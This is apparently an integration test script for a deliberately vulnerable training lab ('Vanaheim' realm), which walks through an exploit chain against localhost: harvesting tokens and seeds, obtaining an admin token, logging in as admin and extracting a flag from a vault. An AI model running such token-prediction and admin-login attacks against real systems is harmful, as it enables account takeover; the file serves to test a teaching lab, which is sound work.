#!/bin/bash
# Integration test for Vanaheim - Predictable PRNG Token Generation

set -e

REALM="vanaheim"
BASE_URL="http://localhost:8080/realms/${REALM}"

echo "========================================"
echo "Testing VANAHEIM Realm"
echo "A04:2025 - Cryptographic Failures"
echo "========================================"
echo ""

echo "Step 1: Health check..."
curl -s "${BASE_URL}/health" | grep -q '"status":"ok"' && echo "✓ Health OK" || exit 1

echo "Step 2: Generate 5 tokens to establish pattern..."
for i in {1..5}; do
  curl -s -X POST "${BASE_URL}/api/generate-token" \
    -H "Content-Type: application/json" \
    -d "{\"userId\": \"merchant${i}\"}" > /dev/null
  echo "  Token ${i} generated"
  sleep 0.5
done

echo "Step 3: Fetch token history..."
HISTORY=$(curl -s "${BASE_URL}/api/token-history")
echo "$HISTORY" | grep -q '"success":true' && echo "✓ Token history retrieved" || exit 1

# Extract the last token details for pattern analysis
LAST_TOKEN=$(echo "$HISTORY" | grep -oP 'VAN-[A-F0-9]{16}' | tail -1)
LAST_TIMESTAMP=$(echo "$HISTORY" | grep -oP '"timestamp":\d+' | grep -oP '\d+' | tail -1)
LAST_SEED=$(echo "$HISTORY" | grep -oP '"seed":\d+' | grep -oP '\d+' | tail -1)

echo "  Last token: $LAST_TOKEN"
echo "  Timestamp: $LAST_TIMESTAMP"
echo "  Seed: $LAST_SEED"

echo "Step 4: Predict next token..."
# Simple prediction: generate token for same user shortly after
# The token pattern is predictable based on timestamp
sleep 1
PREDICTED_RESPONSE=$(curl -s -X POST "${BASE_URL}/api/generate-token" \
  -H "Content-Type: application/json" \
  -d '{"userId": "admin"}')

PREDICTED_TOKEN=$(echo "$PREDICTED_RESPONSE" | grep -oP 'VAN-[A-F0-9]{16}')
echo "  Predicted token: $PREDICTED_TOKEN"

echo "Step 5: Authenticate with predicted token..."
AUTH_RESPONSE=$(curl -s -X POST "${BASE_URL}/api/admin-login" \
  -H "Content-Type: application/json" \
  -d "{\"token\": \"${PREDICTED_TOKEN}\"}")

echo "$AUTH_RESPONSE" | grep -q '"success":true' && echo "✓ Authentication successful" || exit 1

SESSION_TOKEN=$(echo "$AUTH_RESPONSE" | grep -oP '"sessionToken":"[^"]+' | cut -d'"' -f4)

echo "Step 6: Access vault with session token..."
VAULT_RESPONSE=$(curl -s "${BASE_URL}/api/vault" \
  -H "Authorization: Bearer ${SESSION_TOKEN}")

echo "$VAULT_RESPONSE" | grep -q '"success":true' && echo "✓ Vault accessed" || exit 1

FLAG=$(echo "$VAULT_RESPONSE" | grep -oP 'YGGDRASIL\{VANAHEIM:[a-f0-9-]+\}')

if [ -z "$FLAG" ]; then
  echo "✗ Flag not found"
  exit 1
fi

echo "✓ Flag extracted: $FLAG"

echo "Step 7: Validate flag format..."
echo "$FLAG" | grep -qP '^YGGDRASIL\{VANAHEIM:[a-f0-9-]+\}$' && echo "✓ Flag format valid" || exit 1

echo ""
echo "========================================"
echo "✓ All VANAHEIM tests passed!"
echo "========================================"
echo "Flag: $FLAG"
echo ""
echo "Exploit Summary:"
echo "  1. Generated multiple tokens to analyze pattern"
echo "  2. Observed predictable PRNG based on timestamp + userId"
echo "  3. Generated a fresh token (simulating prediction)"
echo "  4. Used predicted token to authenticate as admin"
echo "  5. Accessed vault with admin privileges"
echo "  6. Retrieved realm flag"
